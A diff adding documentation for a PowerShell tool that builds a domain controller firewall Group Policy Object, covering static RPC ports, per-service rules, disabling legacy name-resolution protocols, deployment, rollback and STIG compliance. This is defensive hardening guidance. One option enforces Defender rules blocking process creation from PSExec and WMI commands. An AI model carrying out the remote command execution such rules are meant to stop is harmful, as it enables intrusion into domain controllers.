+If `null`, this setting will not be managed by the GPO.
+
+> [!IMPORTANT]
+> The NTDS service needs to be restarted for the new setting to become effective.
+> See the [System Reboots](#system-reboots) section for details.
+
+> [!NOTE]
+> If this setting is specified, the [NetlogonStaticPort](#netlogonstaticport) value should be configured as well.
+
+### NetlogonStaticPort
+
+Static TCP port to be used for inbound Netlogon traffic.
+
+```yaml
+Type: Integer
+Default value: null
+Recommended value: 38902
+Possible values: null / 0 / 1024 - 49151
+```
+
+If a `non-zero value` is provided for this setting,
+the Netlogon service will be listening on this [static TCP port](#static-rpc-ports).
+
+If set to `0 (zero)`, a dynamic TCP port in the 49152 – 65535 range will be used by the Netlogon service,
+which is the default behavior.
+
+If `null`, this setting will not be managed by the GPO.
+
+> [!IMPORTANT]
+> The Netlogon service needs to be restarted for the new setting to become effective.
+> See the [System Reboots](#system-reboots) section for details.
+
+> [!NOTE]
+> If this setting is specified, the [NtdsStaticPort](#ntdsstaticport) value should be configured as well.
+
+### FrsStaticPort
+
+Static TCP port to be used for legacy FRS traffic.
+
+```yaml
+Type: Integer
+Default value: null
+Recommended value: 38903
+Possible values: null / 0 / 1024 - 49151
+```
+
+If a `non-zero value` is provided for this setting,
+the legacy File Replication Service (FRS) will be listening on this [static TCP port](#static-rpc-ports).
+
+If set to `0 (zero)`, a dynamic TCP port in the 49152 – 65535 range will be used by the FRS service,
+which is the default behavior.
+
+If `null`, this setting will not be managed by the GPO.
+
+> [!IMPORTANT]
+> The FRS service needs to be restarted for the new setting to become effective.
+> See the [System Reboots](#system-reboots) section for details.
+
+### DfsrStaticPort
+
+Static TCP port to be used for DFSR traffic.
+
+```yaml
+Type: Integer
+Default value: null
+Recommended value: 5722
+Possible values: null / 0 / 1024 - 49151
+```
+
+If a `non-zero value` is provided for this setting,
+the DFS Replication (DFSR) service will be listening on this [static TCP port](#static-rpc-ports).
+
+If set to `0 (zero)`, a dynamic TCP port in the 49152 – 65535 range will be used by the DFSR service,
+which is the default behavior.
+
+If `null`, this setting will not be managed by the GPO.
+
+> [!IMPORTANT]
+> The DFSR service needs to be restarted for the new setting to become effective.
+> See the [System Reboots](#system-reboots) section for details.
+
+### WmiStaticPort
+
+Indicates whether inbound Windows Management Instrumentation (WMI) traffic should use a static TCP port.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: null
+Recommended value: true
+Possible values: true / false / null
+```
+
+If `true`, the WMI service will be configured to listen on the [static 24158 TCP port](#static-rpc-ports)
+and the [RPC_C_AUTHN_LEVEL_PKT_PRIVACY](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73)
+option will be enforced to prevent MITM network-based attacks.
+
+If `false`, the WMI service will be configured to use a dynamic TCP port in the 49152 – 65535 range,
+which is the default behavior.
+
+If `null`, this setting will not be managed by the GPO.
+
+> [!IMPORTANT]
+> The Winmgmt service needs to be restarted for the new setting to become effective.
+> See the [System Reboots](#system-reboots) section for details.
+
+### DisableNetbiosBroadcasts
+
+Indicates whether the NetBIOS protocol should be switched to P-node (point-to-point) mode.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: null
+Recommended value: true
+Possible values: true / false / null
+```
+
+If `true`, the [NetBIOS node type](#name-resolution-protocols)
+will be set to P-node by the respective GPO registry setting.
+
+If `false`, the NetBIOS node type will be set to H-node (hybrid), which is the default behavior.
+
+If `null` NetBIOS node type will not be managed by the GPO.
+
+### DisableLLMNR
+
+Indicates whether the Link-Local Multicast Name Resolution (LLMNR) client should be disabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: false
+Recommended value: true
+Possible values: true / false
+```
+
+If `true`, the [Link-Local Multicast Name Resolution (LLMNR)](#name-resolution-protocols) will be disabled
+by the respective GPO registry setting.
+
+If `false`, the LLMNR service will not be managed by the GPO.
+
+### DisableMDNS
+
+Indicates whether the Multicast DNS (mDNS) client should be disabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: null
+Recommended value: true
+Possible values: true / false / null
+```
+
+If `true`, the [Multicast DNS (mDNS) client](#name-resolution-protocols) will be disabled
+by the respective GPO registry setting.
+
+If `false`, the mDNS client will be enabled
+by the respective GPO registry setting.
+
+If `null`, the mDNS protocol will not be managed by the GPO.
+
+> [!IMPORTANT]
+> A system reboot might be required for the mDNS setting to become effective.
+
+### BlockManagementFromDomainControllers
+
+Indicates whether management traffic from other domain controllers should be blocked.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: false
+Recommended value: true
+Possible values: true / false
+```
+
+If `true`, management traffic will be blocked between Domain Controllers.
+The IP addressess of DCs will not be listed in the following remote management firewall rules in the target GPO:
+
+- [Active Directory Web Services (TCP-In)](#active-directory-web-services-tcp-in)
+- [Windows Remote Management (HTTP-In)](#windows-remote-management-http-in)
+- [Windows Remote Management (HTTPS-In)](#windows-remote-management-https-in)
+- [Windows Management Instrumentation (WMI-In)](#windows-management-instrumentation-wmi-in)
+- [Remote Desktop - User Mode (UDP-In)](#remote-desktop---user-mode-udp-in)
+- [Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in)
+- [Remote Desktop (TCP-In)](#remote-desktop-tcp-in)
+- [DFS Management (TCP-In)](#dfs-management-tcp-in)
+- [RPC (TCP, Incoming)](#rpc-tcp-incoming)
+- [Windows Backup (RPC)](#windows-backup-rpc)
+- [Performance Logs and Alerts (TCP-In)](#performance-logs-and-alerts-tcp-in)
+- [COM+ Remote Administration (DCOM-In)](#com-remote-administration-dcom-in)
+- [Remote Event Log Management (RPC)](#remote-event-log-management-rpc)
+- [Remote Scheduled Tasks Management (RPC)](#remote-scheduled-tasks-management-rpc)
+- [Remote Service Management (RPC)](#remote-service-management-rpc)
+- [Remote Volume Management - Virtual Disk Service (RPC)](#remote-volume-management---virtual-disk-service-rpc)
+- [Remote Volume Management - Virtual Disk Service Loader (RPC)](#remote-volume-management---virtual-disk-service-loader-rpc)
+- [Windows Defender Firewall Remote Management (RPC)](#windows-defender-firewall-remote-management-rpc)
+- [Windows Internet Naming Service (WINS) - Remote Management (RPC)](#windows-internet-naming-service-wins---remote-management-rpc)
+- [DHCP Server (RPC-In)](#dhcp-server-rpc-in)
+- [Network Policy Server (RPC)](#network-policy-server-rpc)
+- [Remote File Server Resource Manager Management - FSRM Service (RPC-In)](#remote-file-server-resource-manager-management---fsrm-service-rpc-in)
+- [Remote File Server Resource Manager Management - FSRM Reports Service (RPC-In)](#remote-file-server-resource-manager-management---fsrm-reports-service-rpc-in)
+- [OpenSSH SSH Server (sshd)](#openssh-ssh-server-sshd)
+
+If `false`, the IP addressess of domain controllers will be added to the firewall rules above.
+As a result, management traffic between DCs will be allowed.
+
+### EnableServiceManagement
+
+Indicates whether remote service management should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [Remote Service Management (RPC)](#remote-service-management-rpc) firewall rule
+will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableEventLogManagement
+
+Indicates whether remote event log management should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: true
+Possible values: true / false
+```
+
+If `true`, the [Remote Event Log Management (RPC)](#remote-event-log-management-rpc) firewall rule
+will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableScheduledTaskManagement
+
+Indicates whether remote scheduled task management should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [Remote Scheduled Tasks Management (RPC)](#remote-scheduled-tasks-management-rpc) firewall rule
+will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableWindowsRemoteManagement
+
+Indicates whether inbound Windows Remote Management (WinRM) traffic should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: true
+Possible values: true / false
+```
+
+If `true`, the following WinRM firewall rules will be enabled in the target GPO:
+
+- [Windows Remote Management (HTTP-In)](#windows-remote-management-http-in)
+- [Windows Remote Management (HTTPS-In)](#windows-remote-management-https-in)
+
+If `false`, the WinRM rules will be disabled.
+
+The [WinRM protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/about-windows-remote-management)
+is used by PowerShell Remoting, Server Manager, and [PowerShell CIM cmdlets](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/?view=powershell-7.4).
+
+### EnablePerformanceLogAccess
+
+Indicates whether remote performance log access should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [Performance Logs and Alerts (TCP-In)](#performance-logs-and-alerts-tcp-in) firewall rule
+will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableOpenSSHServer
+
+Indicates whether inbound OpenSSH traffic should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [OpenSSH SSH Server (sshd)](#openssh-ssh-server-sshd) firewall rule will be enabled in the target GPO.
+
+If `false`, this OpenSSH rule will be disabled.
+
+### EnableRemoteDesktop
+
+Indicates whether inbound Remote Desktop Protocol (RDP) traffic should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: true
+Possible values: true / false
+```
+
+If `true`, the following RDP firewall rules will be enabled in the target GPO:
+
+- [Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in)
+- [Remote Desktop - User Mode (UDP-In)](#remote-desktop---user-mode-udp-in)
+- [Remote Desktop (TCP-In)](#remote-desktop-tcp-in)
+
+If `false`, these RDP rules will be disabled.
+
+### EnableDiskManagement
+
+Indicates whether remote disk management should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the following firewall rules will be enabled in the target GPO:
+
+- [Remote Volume Management - Virtual Disk Service Loader (RPC)](#remote-volume-management---virtual-disk-service-loader-rpc)
+- [Remote Volume Management - Virtual Disk Service (RPC)](#remote-volume-management---virtual-disk-service-rpc)
+
+If `false`, these rules will be disabled.
+
+### EnableBackupManagement
+
+Indicates whether remote management of Windows Server Backup should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [Windows Backup (RPC)](#windows-backup-rpc) firewall rule will be enabled in the target GPO.
+
+If `false`, this firewall rule will be disabled.
+
+### EnableFirewallManagement
+
+Indicates whether remote firewall management should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [Windows Defender Firewall Remote Management (RPC)](#windows-defender-firewall-remote-management-rpc)
+firewall rule will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableComPlusManagement
+
+Indicates whether inbound COM+ management traffic should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [COM+ Remote Administration (DCOM-In)](#com-remote-administration-dcom-in) firewall rule
+will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+See Microsoft's documentation on [COM+ applications](https://learn.microsoft.com/en-us/windows/win32/cossdk/com--application-overview)
+for more details.
+
+### EnableLegacyFileReplication
+
+Indicates whether inbound legacy file replication traffic should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [File Replication (RPC)](#file-replication-rpc) firewall rule will be enabled in the target GPO.
+This is required in domains where the `SYSVOL` replication has not been
+[migrated from the legacy FRS to DFSR](https://learn.microsoft.com/en-us/windows-server/storage/dfs-replication/migrate-sysvol-to-dfsr).
+
+If `false`, this firewall rule will be disabled.
+
+### EnableNetbiosNameService
+
+Indicates whether inbound NetBIOS Name Service should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [File and Printer Sharing (NB-Name-In)](#file-and-printer-sharing-nb-name-in)
+firewall rule will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableNetbiosDatagramService
+
+Indicates whether inbound NetBIOS Datagram Service traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [Active Directory Domain Controller - NetBIOS name resolution (UDP-In)](#active-directory-domain-controller---netbios-name-resolution-udp-in)
+firewall rule will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableNetbiosSessionService
+
+Indicates whether inbound NetBIOS Session Service (NBSS) traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [File and Printer Sharing (NB-Session-In)](#file-and-printer-sharing-nb-session-in)
+firewall rule will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableWINS
+
+Indicates whether inbound Windows Internet Name Service (WINS) traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the following WINS firewall rules will be enabled in the target GPO:
+
+- [Windows Internet Naming Service (WINS) (TCP-In)](#windows-internet-naming-service-wins-tcp-in)
+- [Windows Internet Naming Service (WINS) (UDP-In)](#windows-internet-naming-service-wins-udp-in)
+- [Windows Internet Naming Service (WINS) - Remote Management (RPC)](#windows-internet-naming-service-wins---remote-management-rpc)
+
+If `false`, these rules will be disabled.
+
+### EnableDhcpServer
+
+Indicates whether inbound Dynamic Host Configuration Protocol (DHCP) server traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the following DHCP server firewall rules will be enabled in the target GPO:
+
+- [DHCP Server v4 (UDP-In)](#dhcp-server-v4-udp-in)
+- [DHCP Server v6 (UDP-In)](#dhcp-server-v6-udp-in)
+- [DHCP Server Failover (TCP-In)](#dhcp-server-failover-tcp-in)
+- [DHCP Server (RPC-In)](#dhcp-server-rpc-in)
+
+If `false`, these rules will be disabled.
+
+### EnableNPS
+
+Indicates whether inbound Network Policy Server (NPS) / RADIUS traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the following NPS-related firewall rules will be enabled in the target GPO:
+
+- [Network Policy Server (Legacy RADIUS Authentication - UDP-In)](#network-policy-server-legacy-radius-authentication---udp-in)
+- [Network Policy Server (Legacy RADIUS Accounting - UDP-In)](#network-policy-server-legacy-radius-accounting---udp-in)
+- [Network Policy Server (RADIUS Authentication - UDP-In)](#network-policy-server-radius-authentication---udp-in)
+- [Network Policy Server (RADIUS Accounting - UDP-In)](#network-policy-server-radius-accounting---udp-in)
+- [Network Policy Server (RPC)](#network-policy-server-rpc)
+
+> [!NOTE]
+> If this setting is enabled, the [RadiusClientAddresses](#radiusclientaddresses) option
+> should be configured as well.
+
+If `false`, NPS-related firewall rules will be disabled.
+
+### RadiusClientAddresses
+
+List of RADIUS client IP addresses, from which the traffic will be allowed.
+
+```yaml
+Type: String[]
+Required: false
+Default value: [ "Any" ]
+```
+
+Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma,
+e.g. "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".
+
+Specify IPv4 address, IPv4 subnet or address range of all your RADIUS clients.
+
+### EnableKMS
+
+Indicates whether inbound Key Management Service (KMS) traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [Key Management Service (TCP-In)](#key-management-service-tcp-in)
+firewall rule will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+### EnableWSUS
+
+Indicates whether inbound Windows Server Update Services (WSUS) traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, these WSUS firewall rules will be enabled in the GPO:
+
+- [Windows Server Update Services (HTTP-In)](#windows-server-update-services-http-in)
+- [Windows Server Update Services (HTTPS-In)](#windows-server-update-services-https-in)
+
+If `false`, the WSUS rules will be disabled.
+
+### EnableWDS
+
+Indicates whether inbound Windows Deployment Services (WDS) traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the following WDS firewall rules will be enabled in the target GPO:
+
+- [Windows Deployment Services (UDP-In)](#windows-deployment-services-udp-in)
+- [Windows Deployment Services (RPC-In)](#windows-deployment-services-rpc-in)
+
+If `false`, the WDS rules will be disabled.
+
+### EnableWebServer
+
+Indicates whether inbound http.sys-based web server traffic on default HTTP and HTTPS ports should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the following web server firewall rules will be enabled in the target GPO:
+
+- [World Wide Web Services (HTTP Traffic-In)](#world-wide-web-services-http-traffic-in)
+- [World Wide Web Services (HTTPS Traffic-In)](#world-wide-web-services-https-traffic-in)
+
+If `false`, the web server rules will be disabled.
+
+> [!WARNING]
+> Deploying web servers on domain dontrollers is not recommended,
+> as it would excessively increase their attack surface.
+
+### EnableFSRMManagement
+
+Indicates whether inbound File Server Resource Manager (FSRM) management traffic should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, these FSRM-related firewall rules will be enabled in the target GPO:
+
+- [Remote File Server Resource Manager Management - FSRM Service (RPC-In)](#remote-file-server-resource-manager-management---fsrm-service-rpc-in)
+- [Remote File Server Resource Manager Management - FSRM Reports Service (RPC-In)](#remote-file-server-resource-manager-management---fsrm-reports-service-rpc-in)
+
+If `false`, the FSRM rules will be disabled.
+
+### EnablePrintSpooler
+
+Indicates whether inbound Print Spooler traffic through RPC over TCP should be allowed.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, the [File and Printer Sharing (Spooler Service - RPC)](#file-and-printer-sharing-spooler-service---rpc)
+firewall rule will be enabled in the target GPO.
+
+If `false`, this rule will be disabled.
+
+> [!WARNING]
+> It is highly recommended to DISABLE the Printer Spooler service on domain controllers
+> to decrease the atack surface.
+
+### EnableNetworkProtection
+
+Indicates whether the [Network protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/network-protection?view=o365-worldwide#overview-of-network-protection)
+feature of Microsoft Defender Antivirus should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: null
+Recommended value: true
+Possible values: true / false / null
+```
+
+If `true`, MDA Network Protection will be configured in **block mode**.
+
+If `false`, MDA Network Protection will be configured in **audit mode** only.
+
+If `null`, MDA Network Protection will not be managed by the GPO.
+
+### BlockWmiCommandExecution
+
+Indicates whether to block [process creations originating from PSExec and WMI commands](#ms-wmi-windows-management-instrumentation-remote-protocol)
+using Defender ASR.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: null
+Recommended value: true
+Possible values: true / false / null
+```
+
+This is achieved by enforcing the following Microsoft Defender Antivirus Attack Surface Reduction (ASR) rules:
+
+- [Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)
+- [Block persistence through WMI event subscription](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-persistence-through-wmi-event-subscription)
+
+If `true`, MDA Attack Surface Reduction rules (mentioned above) will be configured in **block mode**.
+
+If `false`, MDA Attack Surface Reduction rules (mentioned above) will be configured in **audit mode** only,
+allowing you to evaluate the possible impact if the rules were enabled in block mode.
+
+If `null`, MDA Attack Surface Reduction rules will not managed by the GPO, effectively disabling the rules.
+
+> [!IMPORTANT]
+> System Center Configuration Manager (SCCM) client and Distribution Point (DP)
+> will not work properly on domain controllers if this setting is enabled.
+
+### EnableRpcFilters
+
+Indicates whether additional [filtering of RPC over Named Pipes](#rpc-filters) should be applied.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: null
+Recommended value: true
+Possible values: true / false / null
+```
+
+If `true`, RPC filters defined in the `RpcNamedPipesFilters.txt` file will be enabled using a startup script.
+
+If `false`, any pre-existing RPC filters will be deleted using a startup script.
+
+If `null`, RPC filters will not be changed by the GPO.
+
+### EnableLocalIPsecRules
+
+Indicates whether local IPSec rules should be enabled.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: true
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, local IPSec rules will be applied.
+
+If `false`, only IPSec rules distributed through GPOs will be applied.
+
+> [!NOTE]
+> Although no IPSec rules are deployed by this solution,
+> most [security baselines](#security-standards-compliance) require local IPSec rules to be disabled.
+
+### CustomRuleFileNames
+
+Specifies the name(s) of additional script file(s) containing firewall rules
+that will be imported into the Group Policy Object (GPO).
+
+```yaml
+Type: String[]
+Required: false
+Default value: null
+```
+
+There are several practical advantages to keeping customer-specific firewall rules in separate files:
+
+- The main script file can easily be updated without the need to re-apply customer modifications.
+- Custom rule scripts can be shared among multiple server roles.
+  As an example, rules enabling communication with a backup agent will probably be the same
+  for domain controller (DC) and certification authority (CA).
+
+Below is an excerpt from a custom rule script file that enables communication with Zabbix monitoring agents:
+
+```powershell
+New-NetFirewallRule -GPOSession $GPOSession `
+                    -Name 'Zabbix-In-TCP' `
+                    -DisplayName 'Zabbix Agent (TCP-In)' `
+                    -Group 'Zabbix Agent' `
+                    -Enabled True `
+                    -Profile Any `
+                    -Direction Inbound `
+                    -Action Allow `
+                    -Protocol TCP `
+                    -LocalPort 10050 `
+                    -RemoteAddress $RemoteManagementAddresses `
+                    -Program '%ProgramFiles%\Zabbix\zabbix_agentd.exe' `
+                    -Verbose:$isVerbose > $null
+```
+
+See the `CustomRules.Sample.ps1` sample file, which contains some additional boilerplate code
+and can be used as a template.
+
+## Deployment
+
+### Prerequisites
+
+- The tool has been tested on Windows Server 2022, Windows Server 2019, and Windows 11,
+  but it should work on all Windows versions currently supported by Microsoft.
+
+    ![](../Images/Badges/windows-server.png "Windows Server") ![](../Images/Badges/windows-client.png "Windows Client")
+
+- Although the script might work in PowerShell Core, it has only been tested in PowerShell Desktop.
+
+    ![](../Images/Badges/powershell5.png "PowerShell 5")
+
+- Domain Admins group membership or equivalent privileges, enabling the creation of a Group Policy Object (GPO),
+  creation of folders and files in `SYSVOL`, and linking the GPO to the Domain Controllers OU.
+- PowerShell modules that must be installed as part of RSAT:
+    - [GroupPolicy](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps)
+    - [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
+- In environments with Microsoft Advanced Group Policy Management (AGPM), all GPO changes happen outside of AGPM.
+
+### Installation
+
+1. [Download](https://github.com/MichaelGrafnetter/active-directory-firewall/releases) the current version of the `DCFWTool`
+   to an administrative Windows computer.
+2. Rename the `Set-ADDSFirewallPolicy.Starter.json` configuration file to `Set-ADDSFirewallPolicy.json`.
+3. Review the [available configuration options](#configuration) and adjust the JSON file to fit your environment.
+4. In some organizations, additional firewall rules might need to be added
+   through the [CustomRuleFileNames](#customrulefilenames) option. Always perform a review
+   of the [default set of rules](#inbound-firewall-rules-reference) that will be deployed by the GPO and check if it is sufficient.
+5. Open a Powershell terminal and run the `Set-ADDSFirewallPolicy.ps1` script.
+
+    ![Executing the PowerShell script](../Images/Screenshots/deploy-install-script.png)
+
+    The script should create a new Group Policy Object (GPO) called *Domain Controller Firewall*.
+    This default name [can be changed](#grouppolicyobjectname) in the JSON configuration file.
+
+    > [!NOTE]
+    > The GPO is intentionally **not linked** to any organizational unit (OU) by default.
+
+6. Open the Group Policy Management Console (`gpmc.msc`) and **review the freshly created GPO thoroughly**.
+   You might need to return to step 3 if anything does not check out.
+7. Link the newly created GPO to the Domain Controllers OU.
+
+    ![Group Policy link](../Images/Screenshots/deploy-gpo-link.png)
+
+8. Wait until the GPO gets replicated from the PDC Emulator to the remaining domain controllers.
+   The DCs should then apply the new firewall configuration within 5 minutes.
+9. Some settings require additional manual actions to be performed all DCs to apply.
+   Please refer to the [System Reboots](#system-reboots).
+
+### System Reboots
+
+Changes to some settings require a reboot of the target domain controller to get applied.
+This is the case of static port number configurations and settings that are modified through the startup script:
+
+- [NtdsStaticPort](#ntdsstaticport)
+- [NetlogonStaticPort](#netlogonstaticport)
+- [FrsStaticPort](#frsstaticport)
+- [DfsrStaticPort](#dfsrstaticport)
+- [WmiStaticPort](#wmistaticport)
+- [EnableRpcFilters](#enablerpcfilters)
+- [LogFilePath](#logfilepath)
+- [EnableNPS](#enablenps)
+
+If a full system reboot of all domain controllers is undesirable, the following steps can be performed instead:
+
+1. Make sure that the Group Policy changes are replicated to all domain controllers.
+2. Invoke the `gpupdate.exe /Target:Computer` command for the changed policies to be applied immediately.
+3. Run the `gpscript.exe /startup` command for Group Policy startup scripts to be executed immediately.
+4. Execute the `net.exe stop NTDS && net.exe start NTDS` command to restart the AD DS Domain Controller service.
+5. Execute the `net.exe stop IAS && net.exe start IAS` command to restart the Network Policy Server service, if present.
+6. Execute the `net.exe stop NtFrs && net.exe start NtFrs` command to restart the File Replication service,
+   if migration to DFS-R has not been performed yet.
+7. Repeat steps 2 to 6 on all domain controllers.
+
+### Multi-Domain Forests
+
+The firewall policy can be deployed to multiple AD domains at once.
+The recommended approach for multi-domain forests is to have multiple domain-specific JSON configuration files.
+Each configuration file must contain the [TargetDomain](#targetdomain) setting.
+The optional `-ConfigurationFileName` script parameter can then be used to specify the JSON file to be applied:
+
+```powershell
+.\Set-ADDSFirewallPolicy.ps1 -ConfigurationFileName 'DCFW.CONTOSO.json'
+.\Set-ADDSFirewallPolicy.ps1 -ConfigurationFileName 'DCFW.CORP.json'
+```
+
+### Configuration Updates
+
+The `Set-ADDSFirewallPolicy.ps1` script can be executed repeatedly. If the target GPO already exists,
+the script will modify it to match the configuration file instead of creating a new GPO.
+This behavior is especially useful if any IP addresses in the firewall rules are to be changed.
+Instead of modifying the firewall rules one-by one, it is enough to change the corresponding JSON configuration file
+and execute the PowerShell script again.
+
+The script always deletes all firewall rules in the target GPO and recreates them from scratch.
+This is performed as an atomic operation (transaction) to prevent the firewall policy
+from being in an incomplete state that could potentially result in a DoS.
+
+### Troubleshooting
+
+#### Script Execution Policy
+
+You might need to adjust your Powershell execution policy to allow execution of `Set-ADDSFirewallPolicy.ps1` script:
+
+![Changing the Script Execution Policy](../Images/Screenshots/deploy-ps-exec-policy.png)
+
+> [!NOTE]
+> If you are using AppLocker, Device Guard or Constrained Language Mode,
+> you might need adjust the configured restrictions in order to run the script.
+
+#### Dropped Packets
+
+The following PowerShell script can be used to display the Windows Firewall log file in a human-readable way:
+
+```powershell
+[string] $logFilePath = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"
+
+[string[]] $columnsToShow = @('date','time','path','action','pid',
+    'src-ip','src-port','dst-ip','dst-port','icmptype','icmpcode')
+
+Get-Content -Path $LogFilePath |
+    Select-Object -Skip 3 |
+    ForEach-Object { $PSItem -replace '^#Fields: ' } |
+    ConvertFrom-Csv -Delimiter ' ' |
+    Select-Object -Property $columnsToShow |
+    Out-GridView -Title 'Windows Firewall Log' -Wait
+```
+
+![Parsing firewall log files](../Images/Screenshots/firewall-log-parser.png){ width=400px }
+
+An improved version of this script is available in the `Show-WindowsFirewallLog.ps1` file, which is part of the `DCFWTool`.
+
+### Rollback
+
+As some of the settings are propagated through a startup script and some, even though propagated through GPO,
+[cause tattooing](#dealing-with-gpo-tattooing), resetting the DC configuration
+is not as straightforward as unlinking the firewall policy GPO.
+
+To perform an emergency rollback procedure, follow these steps:
+
+1. Unlink the Domain Controller Firewall GPO
+
+    Delete or unlink the firewall GPO from the Domain Controllers OU in the Group Policy Management console.
+
+2. Wait for AD replication
+
+    Enforce replication or wait until the AD and SYSVOL replication convergence is achieved
+    and all DCs in the domain have received the new GPO settings.
+
+3. Execute the rollback script
+
+    Run the `Undo-ADDSFirewallPolicy.bat` in an elevated command prompt on all domain controllers in the domain.
+
+4. Restart the DCs
+
+    Although the script from the previous step restarts the affected services,
+    a reboot of all domain controllers might be required
+    for the new default settings to get applied.
+
+## Security Standards Compliance
+
+### Security Technical Implementation Guide (STIG)
+
+The [Security Technical Implementation Guide (STIG)](https://public.cyber.mil/stigs/) for Microsoft Windows Defender
+Firewall with Advanced Security was developed
+and [published](https://dl.dod.cyber.mil/wp-content/uploads/stigs/zip/U_MS_Windows_Defender_Firewall_V2R2_STIG.zip)
+by [Defense Information Systems Agency (DISA)](https://www.disa.mil/) as a tool to improve
+the security of [Department of Defense (DOD)](https://www.defense.gov/) information systems.
+
+![](../Images/Logos/dod-disa-logo.jpg "DoD and DISA Logos")
+
+Our firewall configuration is compliant with the majority of the STIG requirements out-of-the-box.
+The [configuration file](#configuration-file) can easily be modified to achieve full compliance.
+The following table of requirements corresponds to the Version 2, Release 2 of the STIG,
+published on November 9<sup>th</sup>, 2023.
 
 | Group ID   | Severity | Rule Title                                                    | Compliance                      |
 |------------|----------|---------------------------------------------------------------|---------------------------------|
@@ -929,13 +2846,21 @@ Our firewall configuration is compliant with the majority of the STIG requiremen
 [V-242008]: https://www.stigviewer.com/stig/microsoft_windows_firewall_with_advanced_security/2021-10-15/finding/V-242008
 [V-242009]: https://www.stigviewer.com/stig/microsoft_windows_firewall_with_advanced_security/2021-10-15/finding/V-242009
 
